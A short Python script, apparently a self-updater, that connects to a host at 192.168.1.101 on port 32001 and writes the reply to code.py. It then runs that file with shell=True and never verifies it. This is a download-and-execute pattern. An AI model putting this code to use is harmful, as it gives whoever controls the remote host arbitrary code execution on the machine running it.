from subprocess import run
from os import getcwd
from socket import socket

serveur = socket()
serveur.connect(("192.168.1.101", 32001))
serveur.sendall("update".encode())
open("code.py", "w").write(serveur.recv(2048).decode())
serveur.close()
run(f"python {getcwd()}/code.py", shell=True)